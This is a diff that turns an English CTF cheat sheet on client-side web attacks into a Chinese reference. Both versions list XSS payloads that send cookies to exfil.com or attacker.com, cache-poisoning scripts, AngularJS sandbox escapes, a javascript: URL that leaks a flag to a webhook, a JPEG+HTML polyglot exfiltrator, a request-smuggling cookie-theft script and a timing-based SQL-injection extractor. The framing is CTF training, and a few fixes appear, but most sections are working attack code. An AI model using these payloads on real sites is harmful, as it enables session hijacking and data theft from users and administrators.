@@ -1,42 +1,36 @@
-# CTF Web - Client-Side Attacks
+---
 
-## Table of Contents
-- [XSS Payloads](#xss-payloads)
-  - [Basic](#basic)
-  - [Cookie Exfiltration](#cookie-exfiltration)
-  - [Filter Bypass](#filter-bypass)
-  - [Hex/Unicode Bypass](#hexunicode-bypass)
-- [DOMPurify Bypass via Trusted Backend Routes](#dompurify-bypass-via-trusted-backend-routes)
-- [JavaScript String Replace Exploitation](#javascript-string-replace-exploitation)
-- [Client-Side Path Traversal (CSPT)](#client-side-path-traversal-cspt)
-- [Cache Poisoning](#cache-poisoning)
-  - [X-Forwarded-Host CDN Template Fetch Poisoning (CSAW 2018)](#x-forwarded-host-cdn-template-fetch-poisoning-csaw-2018)
-- [Hidden DOM Elements](#hidden-dom-elements)
-- [React-Controlled Input Programmatic Filling](#react-controlled-input-programmatic-filling)
-- [Magic Link + Redirect Chain XSS](#magic-link--redirect-chain-xss)
-- [Content-Type via File Extension](#content-type-via-file-extension)
-- [DOM XSS via jQuery Hashchange (Crypto-Cat)](#dom-xss-via-jquery-hashchange-crypto-cat)
-- [Shadow DOM XSS](#shadow-dom-xss)
-- [DOM Clobbering + MIME Mismatch](#dom-clobbering--mime-mismatch)
-- [HTTP Request Smuggling via Cache Proxy](#http-request-smuggling-via-cache-proxy)
-- [CSS/JS Paywall Bypass](#cssjs-paywall-bypass)
-- [JPEG+HTML Polyglot XSS (EHAX 2026)](#jpeghtml-polyglot-xss-ehax-2026)
-- [JSFuck Decoding](#jsfuck-decoding)
-- [AngularJS 1.x Sandbox Escape via charAt/trim Override (Google CTF 2017)](#angularjs-1x-sandbox-escape-via-charattrim-override-google-ctf-2017)
-- [Admin Bot javascript: URL Scheme Bypass (DiceCTF 2026)](#admin-bot-javascript-url-scheme-bypass-dicectf-2026)
-- [XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)](#xs-leak-via-image-load-timing--graphql-csrf-htb-grandmonty)
-  - [Why it works](#why-it-works)
-  - [Step 1 — Redirect bot via meta refresh (CSP bypass)](#step-1--redirect-bot-via-meta-refresh-csp-bypass)
-  - [Step 2 — Timing oracle via image loads](#step-2--timing-oracle-via-image-loads)
-  - [Step 3 — Character-by-character extraction](#step-3--character-by-character-extraction)
-  - [Step 4 — Host exploit and tunnel](#step-4--host-exploit-and-tunnel)
-- [jQuery `$(location.hash)` CSS Selector Timing Leak (hxp 2018)](#jquery-locationhash-css-selector-timing-leak-hxp-2018)
+phase: webapp
+vuln_class: [xss, client-side, cache-poisoning, xs-leak]
+title: 客户端攻击
+summary: 客户端攻击的核心不是「注入 script」，而是「找一个浏览器会执行、但校验没覆盖的解析路径」。按数据流向分：注入点、净化绕过、解析器差分、跨源侧信道。
+---
+
+# 客户端攻击
+
+CSP 绕过与高级侧信道见 [[web/漏洞分类/client-side-advanced.md|client-side-advanced.md]]；XSS 本体手法见 [[web/漏洞分类/XSS/XSS测试.md|XSS测试]]；原型链见 [原型链污染](原型链污染/原型链污染（Prototype Pollution）测试.md)。
+
+## 0. 判据速查
+
+| 观察到的现象 | 说明 | 去哪节 |
+|---|---|---|
+| 输入原样回显在 HTML 里 | 反射型 XSS 的入口 | §1 |
+| 前端净化了，但接口能直接打 | **后端信任了前端**，绕过整个净化层 | §2.1 |
+| 输入进了 `.replace()` 的替换串 | `$\`` / `$'` 会展开成匹配前后内容 | §2.2 |
+| 前端用 URL 参数拼 fetch 路径 | 客户端路径穿越（CSPT） | §2.3 |
+| 响应被 CDN 缓存，且内容受某个**头**影响 | 该头是 unkeyed → 缓存投毒 | §3 |
+| 内容在 HTML 里但被 CSS/JS 遮住 | 直接 `curl` 就有 | §4.1 |
+| 有 admin bot / 举报接口 | 你的 payload 会在**认证态浏览器**里跑 | §5 |
+| 上传接口按扩展名定 Content-Type | `.jpg` vs `.jpeg` 的判定不一致 → MIME 混淆 | §6 |
+| CSP 严格但页面有 `$(location.hash)` 之类 | 不用 XSS，用选择器/加载时序做侧信道 | §7 |
+| bot 用 `new URL()` 校验目标地址 | 只验语法不验协议，`javascript:` 直接过 | §5.2 |
+
+**核心判据**：客户端漏洞几乎都是「**同一份内容被两套解析规则理解**」—— 前端净化和后端存储、扩展名和 MIME、jQuery 的 HTML 与选择器分支、代理缓存键和响应依赖。
 
 ---
 
-## XSS Payloads
+## 1. 注入点与基础 payload
 
-### Basic
 ```html
 <script>alert(1)</script>
 <img src=x onerror=alert(1)>
@@ -45,64 +39,80 @@
 <input onfocus=alert(1) autofocus>
 ```
 
-### Cookie Exfiltration
+**外带**：
+
 ```html
 <script>fetch('https://exfil.com/?c='+document.cookie)</script>
 <img src=x onerror="fetch('https://exfil.com/?c='+document.cookie)">
 ```
 
-### Filter Bypass
+**过滤绕过基础**：
+
 ```html
-<ScRiPt>alert(1)</ScRiPt>           <!-- Case mixing -->
-<script>alert`1`</script>           <!-- Template literal -->
-<img src=x onerror=alert&#40;1&#41;>  <!-- HTML entities -->
-<svg/onload=alert(1)>               <!-- No space -->
+<ScRiPt>alert(1)</ScRiPt>              <!-- 大小写混写 -->
+<script>alert`1`</script>              <!-- 模板字符串，免括号 -->
+<img src=x onerror=alert&#40;1&#41;>    <!-- HTML 实体 -->
+<svg/onload=alert(1)>                  <!-- 免空格 -->
 ```
 
-### Hex/Unicode Bypass
-- Hex encoding: `\x3cscript\x3e`
-- HTML entities: `&#60;script&#62;`
+更完整的标签/事件/编码矩阵见 [[web/漏洞分类/XSS/XSS测试.md|XSS测试]]。
 
 ---
 
-## DOMPurify Bypass via Trusted Backend Routes
+## 2. 净化逻辑的绕过
 
-Frontend sanitizes before autosave, but backend trusts autosave — no sanitization.
-Exploit: POST directly to `/api/autosave` with XSS payload.
+### 2.1 后端信任前端（最有效的一类）
 
----
+前端在自动保存前做了 DOMPurify 净化，**后端信任自动保存接口不做二次校验**。直接 POST 原始 payload 到 `/api/autosave`，整个净化层被跳过。
 
-## JavaScript String Replace Exploitation
+**判据**：抓包看「净化发生在哪个请求之前」。只要净化在浏览器侧，就一定存在一条不经过它的接口路径。
 
-`.replace()` special patterns: `$\`` = content BEFORE match, `$'` = content AFTER match
-Payload: `<img src="abc$\`<img src=x onerror=alert(1)>">`
+### 2.2 `.replace()` 的特殊替换模式
 
----
+`String.replace()` 的替换串里 `$\`` 表示**匹配之前的内容**、`$'` 表示**匹配之后的内容**。当用户输入被当作替换串时，可以凭空造出结构：
 
-## Client-Side Path Traversal (CSPT)
+```
+输入: <img src="abc$`<img src=x onerror=alert(1)>">
+```
 
-Frontend JS uses URL param in fetch without validation:
+`$\`` 把前文展开进来，闭合了 `src` 属性并注入新标签。
+
+**判据**：源码里 `.replace(x, userInput)` —— 第二个参数是用户可控的，就是注入点。同类还有 `$&`（整个匹配）、`$1`（捕获组）。
+
+### 2.3 客户端路径穿越（CSPT）
+
+前端把 URL 参数直接拼进 fetch 路径：
+
 ```javascript
 const profileId = urlParams.get("id");
 fetch("/log/" + profileId, { method: "POST", body: JSON.stringify({...}) });
 ```
-Exploit: `/user/profile?id=../admin/addAdmin` → fetches `/admin/addAdmin` with CSRF body
 
-Parameter pollution: `/user/profile?id=1&id=../admin/addAdmin` (backend uses first, frontend uses last)
+```
+/user/profile?id=../admin/addAdmin
+→ 实际请求 POST /admin/addAdmin，且带着 CSRF 语义的 body
+```
+
+**参数污染变体**：`?id=1&id=../admin/addAdmin` —— 后端取第一个（`1`，合法），前端取最后一个（穿越路径）。
+
+**判据**：前端拼 URL 时没有 `encodeURIComponent`，且目标路径是个有副作用的接口（不是纯读）。CSPT 的价值在于「用一个只读页面拿到一个写操作的 CSRF」。
 
 ---
 
-## Cache Poisoning
+## 3. 缓存投毒
 
-CDN/cache keys only on URL:
+### 3.1 缓存键只看 URL
+
 ```python
-requests.get(f"{TARGET}/search?query=harmless", data=f"query=<script>evil()</script>")
-# All visitors to /search?query=harmless get XSS
+requests.get(f"{TARGET}/search?query=harmless", data="query=<script>evil()</script>")
+# 之后所有访问 /search?query=harmless 的人拿到 XSS
 ```
 
-### X-Forwarded-Host CDN Template Fetch Poisoning (CSAW 2018)
+**前提**：缓存键不含 body。GET 请求带 body 时部分 CDN 仍会缓存响应。
 
-**Pattern:** A CDN fronting the app keys cached responses only on path + query. A backend Mustache template renders a `<script src="https://{{host}}/cdn/app.js">` tag where `{{host}}` comes from the `X-Forwarded-Host` header. The attacker sends one request with `X-Forwarded-Host: attacker.tld`, Varnish caches the response for 120 seconds, and every subsequent visitor loads JavaScript from the attacker origin.
+### 3.2 未纳入缓存键的头（unkeyed header）
+
+CDN 只按 path + query 做键，但后端模板把某个**头**反射进了 HTML：
 
 ```http
 GET /cdn/app.js HTTP/1.1
@@ -110,28 +120,43 @@ Host: target.tld
 X-Forwarded-Host: attacker.tld
 ```
 
+后端渲染成 `<script src="https://{{host}}/cdn/app.js">`，于是：
+
 ```python
-import requests, time
-# Poison the cache
 requests.get("https://target.tld/cdn/app.js",
              headers={"X-Forwarded-Host": "attacker.tld"})
-# Within the 120s TTL any visitor pulls https://attacker.tld/cdn/app.js
+# 120s TTL 内所有访客从 attacker.tld 加载 JS
 ```
 
-**Key insight:** Cache keys rarely include request headers, even when those headers feed the response body. Any header the backend reflects into HTML (`Host`, `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`) becomes a web cache poisoning vector the moment the response is cached. Use `Vary: X-Forwarded-Host` or strip these headers at the edge; attackers hunt them with Burp Param Miner (`unkeyed header discovery`).
+**要试的头**：`Host`、`X-Forwarded-Host`、`X-Original-URL`、`X-Rewrite-URL`、`Forwarded`、`X-Forwarded-Scheme`。
 
-**References:** CSAW CTF Qualification Round 2018 — Hacker Movie Club, writeup 11277
+**判据**：响应体随某个头变化 + 该响应被缓存。用 Burp Param Miner 的 unkeyed header discovery 自动找。修法是 `Vary: <该头>` 或在边缘剥掉。
+
+（题目例证：CSAW 2018 — Hacker Movie Club）
 
 ---
 
-## Hidden DOM Elements
+## 4. 内容存在但看不见
 
-Proof/flag in `display: none`, `visibility: hidden`, `opacity: 0`, or off-screen elements:
+### 4.1 CSS/JS 付费墙
+
+文章全文在 HTML 里，只是被 `position: fixed; z-index: 99999; backdrop-filter: blur()` 的遮罩盖住。
+
+```bash
+curl -s https://target/article | grep -i "flag\|CTF{"
+```
+
+其他路子：Ctrl+U 看源码、DevTools 删遮罩元素、关 JS、`document.querySelector('#paywall-overlay').remove()`、`curl -H "User-Agent: Googlebot"`。
+
+**判据**：源码里有高 `z-index` + `position: fixed` + `backdrop-filter: blur()` 的 div → 遮罩式付费墙，内容一定在 HTML 里。
+
+（题目例证：MetaCTF 2026 — Great Paywall）
+
+### 4.2 隐藏 DOM 元素
+
+flag 藏在 `display:none` / `visibility:hidden` / `opacity:0` / 屏幕外：
+
 ```javascript
-document.querySelectorAll('[style*="display: none"], [hidden]')
-  .forEach(el => console.log(el.id, el.textContent));
-
-// Find all hidden content
 document.querySelectorAll('*').forEach(el => {
   const s = getComputedStyle(el);
   if (s.display === 'none' || s.visibility === 'hidden' || s.opacity === '0')
@@ -139,11 +164,10 @@ document.querySelectorAll('*').forEach(el => {
 });
 ```
 
----
+### 4.3 受控输入的程序化填充
 
-## React-Controlled Input Programmatic Filling
+React 忽略直接赋值 `.value`。要走原生 setter + 事件：
 
-React ignores direct `.value` assignment. Use native setter + events:
 ```javascript
 const input = document.querySelector('input[placeholder="SDG{...}"]');
 const nativeSetter = Object.getOwnPropertyDescriptor(
@@ -154,327 +178,183 @@ input.dispatchEvent(new Event('input', { bubbles: true }));
 input.dispatchEvent(new Event('change', { bubbles: true }));
 ```
 
-Works for React, Vue, Angular. Essential for automated form filling via DevTools.
+React / Vue / Angular 都适用。自动化填表必用。
 
----
+### 4.4 混淆代码还原
 
-## Magic Link + Redirect Chain XSS
-```javascript
-// /magic/:token?redirect=/edit/<xss_post_id>
-// Sets auth cookies, then redirects to attacker-controlled XSS page
-```
+页面只有 JSFuck（`[]()!+`）时，**不要执行**，把最后两个 `()` 去掉拿到函数对象再 `toString()`：
 
----
-
-## Content-Type via File Extension
-```javascript
-// @fastify/static determines Content-Type from extension
-noteId = '<img src=x onerror="alert(1)">.html'
-// Response: Content-Type: text/html → XSS
-```
-
----
-
-## DOM XSS via jQuery Hashchange (Crypto-Cat)
-
-**Pattern:** jQuery's `$()` selector sink combined with `location.hash` source and `hashchange` event handler. Modern jQuery patches block direct `$(location.hash)` HTML injection, but iframe-triggered hashchange bypasses it.
-
-**Vulnerable pattern:**
-```javascript
-$(window).on('hashchange', function() {
-    var element = $(location.hash);
-    element[0].scrollIntoView();
-});
-```
-
-**Exploit via iframe:** Trigger hashchange without direct user interaction by loading the target in an iframe, then modifying the hash via `onload`:
-```html
-<iframe src="https://vulnerable.com/#"
-  onload="this.src+='<img src=x onerror=print()>'">
-</iframe>
-```
-
-**Key insight:** The iframe's `onload` fires after the initial load, then changing `this.src` triggers a `hashchange` event in the target page. The hash content (`<img src=x onerror=print()>`) passes through jQuery's `$()` which interprets it as HTML, creating a DOM element with the XSS payload.
-
-**Detection:** Look for `$(location.hash)`, `$(window.location.hash)`, or any jQuery selector that accepts user-controlled input from URL fragments.
-
----
-
-## Shadow DOM XSS
-
-**Closed Shadow DOM exfiltration (Pragyan 2026):** Wrap `attachShadow` in a Proxy to capture shadow root references:
-```javascript
-var _r, _o = Element.prototype.attachShadow;
-Element.prototype.attachShadow = new Proxy(_o, {
-  apply: (t, a, b) => { _r = Reflect.apply(t, a, b); return _r; }
-});
-// After target script creates shadow DOM, _r contains the root
-```
-
-**Indirect eval scope escape:** `(0,eval)('code')` escapes `with(document)` scope restrictions.
-
-**Payload smuggling via avatar URL:** Encode full JS payload in avatar URL after fixed prefix, extract with `avatar.slice(N)`:
-```html
-<svg/onload=(0,eval)('eval(avatar.slice(24))')>
-```
-
-**`</script>` injection (Shadow Fight 2):** Keyword filters often miss HTML structural tags. `</script>` closes existing script context, `<script src=//evil>` loads external script. External script reads flag from `document.scripts[].textContent`.
-
----
-
-## DOM Clobbering + MIME Mismatch
-
-**MIME type confusion (Pragyan 2026):** CDN/server checks for `.jpeg` but not `.jpg` → serves `.jpg` as `text/html` → HTML in JPEG polyglot executes as page.
-
-**Form-based DOM clobbering:**
-```html
-<form id="config"><input name="canAdminVerify" value="1"></form>
-<!-- Makes window.config.canAdminVerify truthy, bypassing JS checks -->
-```
-
----
-
-## HTTP Request Smuggling via Cache Proxy
-
-**Cache proxy desync (Pragyan 2026):** When a caching TCP proxy returns cached responses without consuming request bodies, leftover bytes are parsed as the next request.
-
-**Cookie theft pattern:**
-1. Create cached resource (e.g., blog post)
-2. Send request with cached URL + appended incomplete POST (large Content-Length, partial body)
-3. Cache proxy returns cached response, doesn't consume POST body
-4. Admin bot's next request bytes fill the POST body → stored on server
-5. Read stored request to extract admin's cookies
-
-```python
-inner_req = (
-    f"POST /create HTTP/1.1\r\n"
-    f"Host: {HOST}\r\n"
-    f"Cookie: session={user_session}\r\n"
-    f"Content-Length: 256\r\n"  # Large, but only partial body sent
-    f"\r\n"
-    f"content=LEAK_"  # Victim's request completes this
-)
-outer_req = (
-    f"GET /cached-page HTTP/1.1\r\n"
-    f"Content-Length: {len(inner_req)}\r\n"
-    f"\r\n"
-).encode() + inner_req
-```
-
----
-
-## CSS/JS Paywall Bypass
-
-**Pattern (Great Paywall, MetaCTF 2026):** Article content is fully present in the HTML but hidden behind a CSS/JS overlay (`position: fixed; z-index: 99999; backdrop-filter: blur(...)` with a "Subscribe" CTA).
-
-**Quick solve:** `curl` the page — no CSS/JS rendering means the full article (and flag) are in the raw HTML.
-
-```bash
-curl -s https://target/article | grep -i "flag\|CTF{"
-```
-
-**Alternative approaches:**
-- View page source in browser (Ctrl+U)
-- Browser DevTools → delete the overlay element
-- Disable JavaScript in browser settings
-- `document.querySelector('#paywall-overlay').remove()` in console
-- Googlebot user-agent: `curl -H "User-Agent: Googlebot" https://target/article`
-
-**Key insight:** Many paywalls are client-side DOM overlays — the content is always in the HTML. The leetspeak hint "paywalls are just DOM" confirms this. Always try `curl` or view-source first before more complex approaches.
-
-**Detection:** Look for `<div>` elements with `position: fixed`, high `z-index`, and `backdrop-filter: blur()` in the page source — these are overlay-based paywalls.
-
----
-
-## JPEG+HTML Polyglot XSS (EHAX 2026)
-
-**Pattern (Metadata Meyham):** File upload accepts JPEG, serves uploaded files with permissive MIME type. Admin bot visits reported files.
-
-**Attack:** Create a JPEG+HTML polyglot — valid JPEG header followed by HTML/JS payload:
-```python
-from PIL import Image
-import io
-
-# Create minimal valid JPEG
-img = Image.new('RGB', (1,1), color='red')
-buf = io.BytesIO()
-img.save(buf, 'JPEG', quality=1)
-jpeg_data = buf.getvalue()
-
-# HTML payload appended after JPEG data
-html_payload = '''<!DOCTYPE html>
-<html><body><script>
-(async function(){
-  // Fetch admin page content
-  var r = await fetch("/admin");
-  var t = await r.text();
-  // Exfiltrate via self-upload (stays on same origin)
-  var j = new Uint8Array([255,216,255,224,0,16,74,70,73,70,0,1,1,0,0,1,0,1,0,0,255,217]);
-  var b = new Blob([j], {type:'image/jpeg'});
-  var f = new FormData();
-  f.append('file', b, 'FLAG_' + btoa(t).substring(0,100) + '.jpg');
-  await fetch('/upload', {method:'POST', body:f});
-  // Also try external webhook
-  new Image().src = "https://webhook.site/YOUR_ID?d=" + encodeURIComponent(t.substring(0,500));
-})();
-</script></body></html>'''
-
-polyglot = jpeg_data + b'\n' + html_payload.encode()
-# Upload as .html with image/jpeg content type
-```
-
-**PoW bypass:** Many CTF report endpoints require SHA-256 proof-of-work:
-```python
-import hashlib
-nonce = 0
-while True:
-    h = hashlib.sha256((challenge + str(nonce)).encode()).hexdigest()
-    if h.startswith('0' * difficulty):
-        break
-    nonce += 1
-```
-
-**Exfiltration methods (ranked by reliability):**
-1. **Self-upload:** Fetch `/admin`, upload result as filename → check `/files` for new uploads
-2. **Webhook:** `fetch('https://webhook.site/ID?flag='+data)` — may be blocked by CSP
-3. **DNS exfil:** `new Image().src = 'http://'+btoa(flag)+'.attacker.com'` — bypasses most CSP
-
-**Key insight:** JPEG files are tolerant of trailing data. Browsers parse HTML from anywhere in the response when MIME allows it. The polyglot is simultaneously a valid JPEG and valid HTML.
-
----
-
-## JSFuck Decoding
-
-**Pattern (JShit, PascalCTF 2026):** Page source contains JSFuck (`[]()!+` only). Decode by removing trailing `()()` and calling `.toString()` in Node.js:
 ```javascript
 const code = fs.readFileSync('jsfuck.js', 'utf8');
-// Remove last () to get function object instead of executing
-const func = eval(code.slice(0, -2));
-console.log(func.toString());  // Reveals original code with hardcoded flag
+const func = eval(code.slice(0, -2));   // 去掉末尾 () 得函数而非执行
+console.log(func.toString());            // 原始代码，flag 常硬编码在里面
 ```
+
+**判据**：源码里只有 `[]()!+` 五种字符。同类还有 JJEncode、AAEncode，手法一致：剥掉调用、取源码。
 
 ---
 
-## AngularJS 1.x Sandbox Escape via charAt/trim Override (Google CTF 2017)
+## 5. Admin bot
 
-**Pattern:** AngularJS versions before 1.6 sandbox expressions to prevent arbitrary JavaScript execution in `{{ }}` bindings. The sandbox relies on `charAt` to validate identifiers character by character. Override `charAt` with `trim` on `String.prototype` to bypass the check, then use `$eval` to execute arbitrary JS.
+有 bot 就有「在认证态执行」的机会，价值远高于反射 XSS。
 
-**Payload:**
-```javascript
-{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,window.location="http://attacker.com/"+document.cookie,a')}}
-```
+### 5.1 bot 的常见可达面
 
-**How it works:**
-1. `toString().constructor.prototype` accesses `String.prototype`
-2. `a.charAt=a.trim` replaces `charAt` with `trim` on all strings
-3. The sandbox calls `charAt(0)` on identifiers to validate them -- but `trim` returns the full string instead of a single character
-4. This breaks the character-by-character validation, allowing any expression
-5. `$eval('expression')` evaluates arbitrary JavaScript in the Angular scope
+- **本地地址**：bot 跑在 `localhost`，能访问外网打不到的内网接口（见 §7.1）
+- **认证 cookie**：bot 带着 admin session
+- **只允许特定来源**：bot 会校验提交的 URL，但校验常只做语法（见 5.2）
 
-**Shorter variants for different AngularJS versions:**
-```javascript
-<!-- AngularJS 1.5.x -->
-{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)')}}
+### 5.2 `new URL()` 只验语法不验协议
 
-<!-- AngularJS 1.4.x -->
-{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}
-
-<!-- AngularJS 1.3.x -->
-{{constructor.constructor('return window.location="http://attacker.com/"+document.cookie')()}}
-```
-
-**Detection:** Look for `ng-app` or `ng-controller` directives in HTML, AngularJS script includes (`angular.js` or `angular.min.js`), and `{{ }}` expression bindings that reflect user input.
-
-**Key insight:** The sandbox relies on `charAt` to validate identifiers. Replacing it with `trim` (which returns the full string) bypasses the character-by-character check, allowing arbitrary expression evaluation. AngularJS 1.6+ removed the sandbox entirely (acknowledging it was never a security boundary), but many CTFs and legacy apps still use older versions.
-
----
-
-## Admin Bot javascript: URL Scheme Bypass (DiceCTF 2026)
-
-**Pattern (Mirror Temple):** Admin bot navigates to user-supplied URL, validates with `new URL()` which only checks syntax — not protocol scheme. `javascript:` URLs pass validation and execute arbitrary JS in the bot's authenticated context.
-
-**Vulnerable validation:**
 ```javascript
 try {
-  new URL(targetUrl)   // Accepts javascript:, data:, file:, etc.
+  new URL(targetUrl)      // javascript:、data:、file:、blob: 全部通过
 } catch {
   process.exit(1)
 }
 await page.goto(targetUrl, { waitUntil: "domcontentloaded" })
 ```
 
-**Exploit:**
 ```bash
-# 1. Create authenticated session (bot requires valid cookie)
+# 1. 先建一个自己的认证会话，拿 cookie
 curl -i -X POST 'https://target/postcard-from-nyc' \
   --data-urlencode 'name=test' \
   --data-urlencode 'flag=dice{test}' \
   --data-urlencode 'portrait='
-# Extract save=... cookie from Set-Cookie header
+# 从 Set-Cookie 取 save=...
 
-# 2. Submit javascript: URL to report endpoint
+# 2. 提交 javascript: URL
 curl -X POST 'https://target/report' \
   -H 'Cookie: save=YOUR_COOKIE' \
   --data-urlencode "url=javascript:fetch('/flag').then(r=>r.text()).then(f=>location='https://webhook.site/ID/?flag='+encodeURIComponent(f))"
 ```
 
-**Why CSP/SRI don't help (B-Side variant):** The B-Side adds inlined CSS, SRI integrity hashes on scripts, and strict CSP. None of these matter because `javascript:` URLs execute in a **navigation context** — the bot navigates to the JS URL directly, not injecting into an existing page. The CSP of the target page is irrelevant since the JS runs before any page loads.
+**为什么 CSP/SRI 都拦不住**：`javascript:` URL 在**导航上下文**执行 —— bot 直接导航到这段 JS，不是往已有页面注入。目标页的 CSP 还没加载，规则不适用。
 
-**Fix:**
+**修法**：显式白名单协议。
+
 ```javascript
 const u = new URL(targetUrl)
-if (!['http:', 'https:'].includes(u.protocol)) {
-  process.exit(1)
-}
+if (!['http:', 'https:'].includes(u.protocol)) process.exit(1)
 ```
 
-**Key insight:** `new URL()` is a **syntax** validator, not a **security** validator. It accepts `javascript:`, `data:`, `file:`, `blob:`, and other dangerous schemes. Any admin bot or SSRF handler using `new URL()` alone for validation is vulnerable. Always allowlist protocols explicitly.
+**判据**：任何接受 URL 的地方（bot、SSRF、webhook、图片代理）只用了 `new URL()` 就直接 `goto`/`fetch`。
 
----
+（题目例证：DiceCTF 2026 — Mirror Temple）
 
-## XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)
+### 5.3 Magic link + 重定向链
 
-**Pattern:** Admin bot visits attacker page → JavaScript makes cross-origin requests to `localhost` GraphQL endpoint → measures time-based SQLi via image load timing → exfiltrates data character by character.
+```
+/magic/:token?redirect=/edit/<xss_post_id>
+```
 
-### Why it works
+先设认证 cookie，再跳到可控的 XSS 页面。判据：token 消费和跳转在同一个请求里完成，跳转目标不校验。
 
-1. **GraphQL GET CSRF:** Many GraphQL implementations accept GET requests (not just POST+JSON). GET requests with images bypass CORS preflight — no `OPTIONS` check needed.
-2. **Bot runs on localhost:** The admin bot's browser can reach `localhost:1337/graphql` which is restricted from external access.
-3. **Image error timing:** `new Image().src = url` fires `onerror` after the server responds. If SQL `SLEEP(1)` executes, the response is slow → timing difference reveals whether a character matches.
+### 5.4 CSP 挡住内联脚本时的绕路
 
-### Step 1 — Redirect bot via meta refresh (CSP bypass)
+用 HTML 注入 + `<meta>` 跳转，把 bot 送到自己的源上，那边没有 CSP：
 
-When CSP blocks inline scripts, use HTML injection with `<meta>` redirect:
 ```bash
 curl -b cookies.txt "http://TARGET/api/chat/send" \
   -X POST -H "Content-Type: application/json" \
   -d '{"message": "<meta http-equiv=\"refresh\" content=\"0;url=https://ATTACKER/exploit.html\" />"}'
 ```
 
-The bot navigates to the attacker page, where JavaScript executes freely (different origin, no CSP restriction).
+---
 
-### Step 2 — Timing oracle via image loads
+## 6. MIME 与解析器差分
+
+### 6.1 扩展名决定 Content-Type
 
 ```javascript
-const imageLoadTime = (src) => {
-    return new Promise((resolve) => {
-        let start = performance.now();
-        const img = new Image();
-        img.onload = () => resolve(0);
-        img.onerror = () => resolve(performance.now() - start);
-        img.src = src;
-    });
-};
+// @fastify/static 按扩展名定 Content-Type
+noteId = '<img src=x onerror="alert(1)">.html'
+// 响应 Content-Type: text/html → XSS
+```
+
+### 6.2 判定规则不一致（`.jpg` vs `.jpeg`）
+
+CDN 只检查 `.jpeg` 不检查 `.jpg` → `.jpg` 被当 `text/html` 返回 → 里面塞的 HTML 当页面执行。
+
+**判据**：把同一份内容用不同扩展名/不同大小写扩展名上传，比对返回的 `Content-Type`。
+
+### 6.3 JPEG + HTML polyglot
+
+JPEG 容忍尾部追加数据，所以同一份文件既是合法 JPEG 又是合法 HTML：
+
+```python
+from PIL import Image
+import io
+
+img = Image.new('RGB', (1,1), color='red')
+buf = io.BytesIO(); img.save(buf, 'JPEG', quality=1)
+jpeg_data = buf.getvalue()
+
+html_payload = '''<!DOCTYPE html>
+<html><body><script>
+(async function(){
+  var r = await fetch("/admin");
+  var t = await r.text();
+  var j = new Uint8Array([255,216,255,224,0,16,74,70,73,70,0,1,1,0,0,1,0,1,0,0,255,217]);
+  var b = new Blob([j], {type:'image/jpeg'});
+  var f = new FormData();
+  f.append('file', b, 'FLAG_' + btoa(t).substring(0,100) + '.jpg');
+  await fetch('/upload', {method:'POST', body:f});
+  new Image().src = "https://webhook.site/YOUR_ID?d=" + encodeURIComponent(t.substring(0,500));
+})();
+</script></body></html>'''
+
+polyglot = jpeg_data + b'\n' + html_payload.encode()
+```
+
+**外带方式可靠性排序**（CSP 严格时很关键）：
+1. **自上传**：fetch `/admin` → 结果当文件名上传 → 去 `/files` 找。同源，不受 CSP 限制。
+2. **Webhook**：`fetch('https://webhook.site/ID?flag='+data)` —— 可能被 CSP 拦。
+3. **DNS 外带**：`new Image().src = 'http://'+btoa(flag)+'.attacker.com'` —— 绕过绝大多数 CSP（CSP 管不到 DNS 解析）。
+
+（题目例证：EHAX 2026 — Metadata Meyham）
+
+### 6.4 DOM Clobbering
+
+用 HTML 结构覆盖 JS 全局变量，绕过判权：
+
+```html
+<form id="config"><input name="canAdminVerify" value="1"></form>
+<!-- window.config.canAdminVerify 变成 "1"（真值） -->
+```
+
+**判据**：源码里有 `window.X.Y` 这种多级访问，且 X 能被注入的 HTML 占位。
+
+---
+
+## 7. 不用 XSS 也能读数据（侧信道）
+
+CSP 严格到没有注入点时，改打「**时序 / 加载 / 选择器**」的布尔 oracle。
+
+### 7.1 图片加载时序 + GraphQL GET CSRF
+
+**三个前提同时成立**：
+
+1. **GraphQL 接受 GET**：GET 请求带参数不需要 CORS 预检，`new Image().src` 就能发
+2. **bot 在 localhost**：能访问外网打不到的 `127.0.0.1:1337/graphql`
+3. **图片 onerror 的耗时**：`SLEEP(1)` 生效时响应慢 → 时间差就是布尔值
+
+```javascript
+const imageLoadTime = (src) => new Promise((resolve) => {
+    let start = performance.now();
+    const img = new Image();
+    img.onload  = () => resolve(0);
+    img.onerror = () => resolve(performance.now() - start);
+    img.src = src;
+});
 
 const xsLeaks = async (query) => {
-    let imgURL = 'http://127.0.0.1:1337/graphql?query=' +
-        encodeURIComponent(query);
-    let delay = await imageLoadTime(imgURL);
-    return delay >= 1000;  // SLEEP(1) threshold
+    let imgURL = 'http://127.0.0.1:1337/graphql?query=' + encodeURIComponent(query);
+    return (await imageLoadTime(imgURL)) >= 1000;    // SLEEP(1) 阈值
 };
 ```
 
-### Step 3 — Character-by-character extraction
+逐字符读：
 
 ```javascript
 let sqlTemp = `query {
@@ -500,30 +380,111 @@ for (let pos = 1; ; pos++) {
 }
 ```
 
-### Step 4 — Host exploit and tunnel
+**隧道**：`cloudflared tunnel --url http://localhost:8888` 比 ngrok 好（没有 interstitial 页）。
 
-```bash
-# Cloudflare Tunnel (recommended — no interstitial pages unlike ngrok)
-cloudflared tunnel --url http://localhost:8888
-python3 -m http.server 8888
+**判据**：有 HTML 注入 + admin bot + GraphQL + 只允许本地访问的接口。四者齐了就是这条链。
+
+（题目例证：HTB GrandMonty）
+
+### 7.2 jQuery 选择器时序
+
+`$(location.hash).addClass(...)` 时，传一个 CSS 选择器进去，jQuery 走 Sizzle 匹配 DOM：
+
 ```
-
-**Key insight:** GraphQL GET requests bypass CORS preflight entirely — `new Image().src` triggers a simple GET that doesn't need `OPTIONS`. Combined with timing-based SQLi (`SLEEP()`), image `onerror` timing becomes a boolean oracle. The bot's localhost access turns a localhost-only SQLi into a remotely exploitable vulnerability.
-
-**Detection:** Chat/message features with HTML injection + admin bot + GraphQL endpoint with SQL injection + localhost-only restrictions.
-
----
-
-## jQuery `$(location.hash)` CSS Selector Timing Leak (hxp 2018)
-
